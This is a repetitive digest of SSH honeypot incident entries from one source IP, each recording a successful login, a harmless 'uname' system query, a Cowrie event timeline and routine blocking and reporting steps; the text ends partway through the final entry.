### 🔴 HIGH · IR-e49e3c3ad468

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:11` | `cowrie.session.connect` |
| `2026-08-20 19:27:11` | `cowrie.client.version` |
| `2026-08-20 19:27:11` | `cowrie.client.kex` |
| `2026-08-20 19:27:19` | `cowrie.login.success` |
| `2026-08-20 19:27:37` | `cowrie.session.params` |
| `2026-08-20 19:27:37` | `cowrie.command.input` |
| `2026-08-20 19:27:43` | `cowrie.log.closed` |
| `2026-08-20 19:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-924eaf7afedd

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:14` | `cowrie.session.connect` |
| `2026-08-20 19:27:15` | `cowrie.client.version` |
| `2026-08-20 19:27:16` | `cowrie.client.kex` |
| `2026-08-20 19:27:24` | `cowrie.login.success` |
| `2026-08-20 19:27:25` | `cowrie.session.params` |
| `2026-08-20 19:27:25` | `cowrie.command.input` |
| `2026-08-20 19:27:28` | `cowrie.log.closed` |
| `2026-08-20 19:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a70431628604

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:14` | `cowrie.session.connect` |
| `2026-08-20 19:27:15` | `cowrie.client.version` |
| `2026-08-20 19:27:16` | `cowrie.client.kex` |
| `2026-08-20 19:27:28` | `cowrie.login.success` |
| `2026-08-20 19:27:32` | `cowrie.session.params` |
| `2026-08-20 19:27:32` | `cowrie.command.input` |
| `2026-08-20 19:27:34` | `cowrie.log.closed` |
| `2026-08-20 19:27:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cc6deb16eac

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:15` | `cowrie.session.connect` |
| `2026-08-20 19:27:15` | `cowrie.client.version` |
| `2026-08-20 19:27:19` | `cowrie.client.kex` |
| `2026-08-20 19:27:28` | `cowrie.login.success` |
| `2026-08-20 19:27:34` | `cowrie.session.params` |
| `2026-08-20 19:27:34` | `cowrie.command.input` |
| `2026-08-20 19:27:35` | `cowrie.log.closed` |
| `2026-08-20 19:27:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba5a6f658ca6

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:15` | `cowrie.session.connect` |
| `2026-08-20 19:27:15` | `cowrie.client.version` |
| `2026-08-20 19:27:19` | `cowrie.client.kex` |
| `2026-08-20 19:27:24` | `cowrie.login.success` |
| `2026-08-20 19:27:27` | `cowrie.session.params` |
| `2026-08-20 19:27:27` | `cowrie.command.input` |
| `2026-08-20 19:27:31` | `cowrie.log.closed` |
| `2026-08-20 19:27:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6eaa94ef8e4e

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:15` | `cowrie.session.connect` |
| `2026-08-20 19:27:15` | `cowrie.client.version` |
| `2026-08-20 19:27:17` | `cowrie.client.kex` |
| `2026-08-20 19:27:24` | `cowrie.login.success` |
| `2026-08-20 19:27:31` | `cowrie.session.params` |
| `2026-08-20 19:27:31` | `cowrie.command.input` |
| `2026-08-20 19:27:32` | `cowrie.log.closed` |
| `2026-08-20 19:27:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f11eccd865a8

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:16` | `cowrie.session.connect` |
| `2026-08-20 19:27:19` | `cowrie.client.version` |
| `2026-08-20 19:27:22` | `cowrie.client.kex` |
| `2026-08-20 19:27:34` | `cowrie.login.success` |
| `2026-08-20 19:27:41` | `cowrie.session.params` |
| `2026-08-20 19:27:41` | `cowrie.command.input` |
| `2026-08-20 19:27:43` | `cowrie.log.closed` |
| `2026-08-20 19:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80490ac74a28

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:16` | `cowrie.session.connect` |
| `2026-08-20 19:27:19` | `cowrie.client.version` |
| `2026-08-20 19:27:22` | `cowrie.client.kex` |
| `2026-08-20 19:27:28` | `cowrie.login.success` |
| `2026-08-20 19:27:34` | `cowrie.session.params` |
| `2026-08-20 19:27:34` | `cowrie.command.input` |
| `2026-08-20 19:27:35` | `cowrie.log.closed` |
| `2026-08-20 19:27:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a523a9d8180

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:16` | `cowrie.session.connect` |
| `2026-08-20 19:27:19` | `cowrie.client.version` |
| `2026-08-20 19:27:22` | `cowrie.client.kex` |
| `2026-08-20 19:27:28` | `cowrie.login.success` |
| `2026-08-20 19:27:37` | `cowrie.session.params` |
| `2026-08-20 19:27:37` | `cowrie.command.input` |
| `2026-08-20 19:27:38` | `cowrie.log.closed` |
| `2026-08-20 19:27:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73d95a55cc8f

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:19` | `cowrie.session.connect` |
| `2026-08-20 19:27:19` | `cowrie.client.version` |
| `2026-08-20 19:27:23` | `cowrie.client.kex` |
| `2026-08-20 19:27:25` | `cowrie.login.success` |
| `2026-08-20 19:27:29` | `cowrie.session.params` |
| `2026-08-20 19:27:29` | `cowrie.command.input` |
| `2026-08-20 19:27:31` | `cowrie.log.closed` |
| `2026-08-20 19:27:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c642b221a6e6

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:19` | `cowrie.session.connect` |
| `2026-08-20 19:27:19` | `cowrie.client.version` |
| `2026-08-20 19:27:22` | `cowrie.client.kex` |
| `2026-08-20 19:27:37` | `cowrie.login.success` |
| `2026-08-20 19:27:43` | `cowrie.session.params` |
| `2026-08-20 19:27:43` | `cowrie.command.input` |
| `2026-08-20 19:27:43` | `cowrie.log.closed` |
| `2026-08-20 19:27:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8061f4a410d0

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:19` | `cowrie.session.connect` |
| `2026-08-20 19:27:19` | `cowrie.client.version` |
| `2026-08-20 19:27:23` | `cowrie.client.kex` |
| `2026-08-20 19:27:34` | `cowrie.login.success` |
| `2026-08-20 19:27:40` | `cowrie.session.params` |
| `2026-08-20 19:27:40` | `cowrie.command.input` |
| `2026-08-20 19:27:43` | `cowrie.log.closed` |
| `2026-08-20 19:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-470d1c6e8f91

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:19` | `cowrie.session.connect` |
| `2026-08-20 19:27:19` | `cowrie.client.version` |
| `2026-08-20 19:27:23` | `cowrie.client.kex` |
| `2026-08-20 19:27:28` | `cowrie.login.success` |
| `2026-08-20 19:27:29` | `cowrie.session.params` |
| `2026-08-20 19:27:29` | `cowrie.command.input` |
| `2026-08-20 19:27:34` | `cowrie.log.closed` |
| `2026-08-20 19:27:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57a85f49faac

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:23` | `cowrie.session.connect` |
| `2026-08-20 19:27:23` | `cowrie.client.version` |
| `2026-08-20 19:27:31` | `cowrie.client.kex` |
| `2026-08-20 19:27:49` | `cowrie.login.success` |
| `2026-08-20 19:27:54` | `cowrie.session.params` |
| `2026-08-20 19:27:54` | `cowrie.command.input` |
| `2026-08-20 19:27:58` | `cowrie.log.closed` |
| `2026-08-20 19:27:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f23c621b9634

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:23` | `cowrie.session.connect` |
| `2026-08-20 19:27:23` | `cowrie.client.version` |
| `2026-08-20 19:27:26` | `cowrie.client.kex` |
| `2026-08-20 19:27:31` | `cowrie.login.success` |
| `2026-08-20 19:27:36` | `cowrie.session.params` |
| `2026-08-20 19:27:36` | `cowrie.command.input` |
| `2026-08-20 19:27:38` | `cowrie.log.closed` |
| `2026-08-20 19:27:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f93af44fb197

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:23` | `cowrie.session.connect` |
| `2026-08-20 19:27:23` | `cowrie.client.version` |
| `2026-08-20 19:27:24` | `cowrie.client.kex` |
| `2026-08-20 19:27:28` | `cowrie.login.success` |
| `2026-08-20 19:27:33` | `cowrie.session.params` |
| `2026-08-20 19:27:33` | `cowrie.command.input` |
| `2026-08-20 19:27:35` | `cowrie.log.closed` |
| `2026-08-20 19:27:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e292bf0c857

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:23` | `cowrie.session.connect` |
| `2026-08-20 19:27:23` | `cowrie.client.version` |
| `2026-08-20 19:27:24` | `cowrie.client.kex` |
| `2026-08-20 19:27:28` | `cowrie.login.success` |
| `2026-08-20 19:27:39` | `cowrie.session.params` |
| `2026-08-20 19:27:39` | `cowrie.command.input` |
| `2026-08-20 19:28:08` | `cowrie.log.closed` |
| `2026-08-20 19:28:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a87ac48e67be

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:23` | `cowrie.session.connect` |
| `2026-08-20 19:27:23` | `cowrie.client.version` |
| `2026-08-20 19:27:26` | `cowrie.client.kex` |
| `2026-08-20 19:27:32` | `cowrie.login.success` |
| `2026-08-20 19:27:48` | `cowrie.session.params` |
| `2026-08-20 19:27:48` | `cowrie.command.input` |
| `2026-08-20 19:27:49` | `cowrie.log.closed` |
| `2026-08-20 19:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-158f62a63744

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:26` | `cowrie.session.connect` |
| `2026-08-20 19:27:28` | `cowrie.client.version` |
| `2026-08-20 19:27:28` | `cowrie.client.kex` |
| `2026-08-20 19:27:38` | `cowrie.login.success` |
| `2026-08-20 19:27:43` | `cowrie.session.params` |
| `2026-08-20 19:27:43` | `cowrie.command.input` |
| `2026-08-20 19:27:47` | `cowrie.log.closed` |
| `2026-08-20 19:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5362ef4c1e8

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:28` | `cowrie.session.connect` |
| `2026-08-20 19:27:28` | `cowrie.client.version` |
| `2026-08-20 19:27:31` | `cowrie.client.kex` |
| `2026-08-20 19:27:38` | `cowrie.login.success` |
| `2026-08-20 19:27:45` | `cowrie.session.params` |
| `2026-08-20 19:27:45` | `cowrie.command.input` |
| `2026-08-20 19:27:48` | `cowrie.log.closed` |
| `2026-08-20 19:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6fa502bb747

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:28` | `cowrie.session.connect` |
| `2026-08-20 19:27:28` | `cowrie.client.version` |
| `2026-08-20 19:27:29` | `cowrie.client.kex` |
| `2026-08-20 19:27:35` | `cowrie.login.success` |
| `2026-08-20 19:27:41` | `cowrie.session.params` |
| `2026-08-20 19:27:41` | `cowrie.command.input` |
| `2026-08-20 19:27:47` | `cowrie.log.closed` |
| `2026-08-20 19:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c073448cf824

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:28` | `cowrie.session.connect` |
| `2026-08-20 19:27:28` | `cowrie.client.version` |
| `2026-08-20 19:27:28` | `cowrie.client.kex` |
| `2026-08-20 19:27:41` | `cowrie.login.success` |
| `2026-08-20 19:27:46` | `cowrie.session.params` |
| `2026-08-20 19:27:46` | `cowrie.command.input` |
| `2026-08-20 19:27:48` | `cowrie.log.closed` |
| `2026-08-20 19:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f9143da4fa1

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:28` | `cowrie.session.connect` |
| `2026-08-20 19:27:28` | `cowrie.client.version` |
| `2026-08-20 19:27:31` | `cowrie.client.kex` |
| `2026-08-20 19:27:38` | `cowrie.login.success` |
| `2026-08-20 19:27:44` | `cowrie.session.params` |
| `2026-08-20 19:27:44` | `cowrie.command.input` |
| `2026-08-20 19:27:50` | `cowrie.log.closed` |
| `2026-08-20 19:27:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4e137223ce1

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 52s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:31` | `cowrie.session.connect` |
| `2026-08-20 19:27:31` | `cowrie.client.version` |
| `2026-08-20 19:27:32` | `cowrie.client.kex` |
| `2026-08-20 19:27:41` | `cowrie.login.success` |
| `2026-08-20 19:28:19` | `cowrie.session.params` |
| `2026-08-20 19:28:19` | `cowrie.command.input` |
| `2026-08-20 19:28:22` | `cowrie.log.closed` |
| `2026-08-20 19:28:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a02b80664f6

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:31` | `cowrie.session.connect` |
| `2026-08-20 19:27:31` | `cowrie.client.version` |
| `2026-08-20 19:27:34` | `cowrie.client.kex` |
| `2026-08-20 19:27:43` | `cowrie.login.success` |
| `2026-08-20 19:27:49` | `cowrie.session.params` |
| `2026-08-20 19:27:49` | `cowrie.command.input` |
| `2026-08-20 19:27:50` | `cowrie.log.closed` |
| `2026-08-20 19:27:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02bdfde217d1

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:31` | `cowrie.session.connect` |
| `2026-08-20 19:27:31` | `cowrie.client.version` |
| `2026-08-20 19:27:34` | `cowrie.client.kex` |
| `2026-08-20 19:27:42` | `cowrie.login.success` |
| `2026-08-20 19:27:45` | `cowrie.session.params` |
